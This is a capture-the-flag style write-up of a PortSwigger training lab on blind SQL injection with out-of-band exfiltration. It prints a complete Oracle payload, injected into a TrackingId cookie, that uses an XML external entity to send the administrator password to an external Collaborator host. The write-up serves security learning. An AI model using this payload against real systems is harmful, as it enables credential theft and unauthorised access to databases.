---
slug: "ps-sqli-17"
title: "Blind SQL injection with out of band data exfiltration"
platform: "PortSwigger"
difficulty: "Hard"
category: ["Web","SQLi"]
date: "2025-12-23"
minutes: 4
visible: true
tldr: "blind SQL injection vulnerability — solved and documented end to end."
format: "html"
---

<p class="mono lab-crumb">PORTSWIGGER ACADEMY // SQLi SERIES &middot; LAB 17 &middot; <a href="https://github.com/0xWalid/Learnings/tree/main/Portswiggers/01-Sql%20Injection%20Labs/17-Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration.md" target="_blank" rel="noopener">original notes &#8599;</a></p>
<p>Exploit a <strong>blind SQL injection vulnerability</strong> where:</p>
<ul><li>No SQL errors are displayed</li><li>No boolean response differences exist</li><li>No time delays are observable</li></ul>
<p>and <strong>exfiltrate sensitive data (administrator password)</strong> using <strong>out‑of‑band (OAST) interaction via DNS/HTTP requests</strong>.</p>
<p>This lab goes one step further than confirmation — it proves <strong>data theft</strong> through the database itself. Nasty, elegant, and effective</p>
<h2>1. Initial Testing &amp; Dead Ends</h2>
<h2>Parameters Tested</h2>
<ul><li>URL parameters</li><li>POST body parameters</li><li>Cookie parameter: <code>TrackingId</code></li></ul>
<h2>Initial Payloads</h2>
<ul><li>Single quote (<code>'</code>)</li><li>Boolean-based conditions</li><li>Time-delay payloads</li></ul>
<h2>Observation</h2>
<ul><li>No errors</li><li>No response differences</li><li>No delays</li></ul>
<p>At this point, the application was completely silent.</p>
<h2>Critical Insight (Why This Matters)</h2>
<p>Silence does NOT mean safety. It means the app is hardened — not invulnerable.</p>
<p>If you stop here, you’re a lazy fuck. Real attackers don’t need the app to talk back — they make the <strong>database scream over the network</strong>.</p>
<h2>2. Escalation Mindset: OAST or Die</h2>
<p>Since:</p>
<ul><li>Error-based ❌</li><li>Boolean-based ❌</li><li>Time-based ❌</li></ul>
<p>The only remaining feedback channel is <strong>out‑of‑band interaction</strong>.</p>
<p>Key idea:</p>
<p>&gt; If SQL is executed, the database can be forced to make an external request containing stolen data. &gt;</p>
<p>At this point:</p>
<ul><li>Burp Collaborator (OASTify) becomes the oracle</li><li>The browser response becomes irrelevant</li></ul>
<h2>3. Database Assumption</h2>
<p>Based on:</p>
<ul><li>Lab pattern</li><li>Support for <code>dual</code></li><li>XML external entity behavior</li></ul>
<p>The backend database was assumed to be <strong>Oracle</strong>.</p>
<p>Oracle is perfect for OAST exfiltration because:</p>
<ul><li>It supports XML parsing inside SQL</li><li>It allows external entity resolution</li><li>It can concatenate query results into URLs</li></ul>
<h2>4. Data Exfiltration Payload (Oracle)</h2>
<p>The following payload was injected into the <strong><code>TrackingId</code> cookie parameter</strong> (URL‑encoded in the actual request):</p>
<pre class="code" data-lang="sql"><code>'|| (
  SELECT EXTRACTVALUE(
    xmltype(
      '&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY% remoteSYSTEM "http://' ||
           (SELECT password FROM users WHERE username='administrator')
         || '.il7kbx1iun37kkj9i5wrko80yr4isagz.oastify.com/"&gt;
%remote;
       ]&gt;'
    ),
    '/l'
  )
  FROM dual
) --
</code></pre>
<h2>Why This Payload Is Fucking Brutal</h2>
<ul><li>The subquery extracts the <strong>administrator password</strong></li><li>The password is concatenated into a URL</li><li>Oracle resolves the external entity</li><li>The database sends the password <strong>out‑of‑band</strong></li><li>Nothing needs to appear in the HTTP response</li></ul>
<p>This isn’t guessing. This isn’t brute force.</p>
<p>This is <strong>direct data exfiltration through DNS/HTTP</strong>.</p>
<h2>5. Out‑of‑Band Confirmation &amp; Data Theft</h2>
<h2>Result in Burp Collaborator</h2>
<ul><li>An inbound DNS/HTTP interaction was received</li><li>The subdomain contained the <strong>administrator password</strong></li><li>Interaction originated from the target server</li></ul>
<p>At this point:</p>
<ul><li>SQL injection is confirmed</li><li>Data extraction is confirmed</li><li>Administrator credentials are compromised</li></ul>
<p>Absolute checkmate.</p>
<h2>6. Final Result</h2>
<pre class="code" data-lang="text"><code>Username: administrator
Password: &lt;exfiltrated via OAST&gt;</code></pre>
<ul><li>Logged in successfully</li><li>Application confirmed administrator access</li><li>Lab marked as <strong>Solved</strong></li></ul>
<p>&lt;img width="1225" height="247" alt="image" src="https://github.com/user-attachments/assets/872c3762-a267-495b-b42a-f93178b33a23" /&gt;</p>
<h2>7. Key Takeaways (Tattoo This in Your Brain)</h2>
<ul><li>No output ≠ no vulnerability</li><li>Blind SQLi does NOT end at time delays</li><li>OAST is the final escalation path</li><li>Oracle XML external entities are lethal</li><li>Databases don’t need to talk to the app — they can talk to <strong>you</strong></li></ul>
<p>If you don’t test out‑of‑band data exfiltration, you’re missing real‑world SQL injection.</p>
<h2>Notes for My Future Self</h2>
<ul><li>Always test cookies</li><li>Always assume the app will lie to you</li><li>Always think: *How can the database leak data without the app?*</li><li>Burp Collaborator is not optional — it’s mandatory</li></ul>

<details class="flag-box"><summary><span class="flag-label">LAB STATUS</span><span class="flag-hint"></span></summary><code>SQLi SERIES :: LAB 17 COMPLETE</code></details>
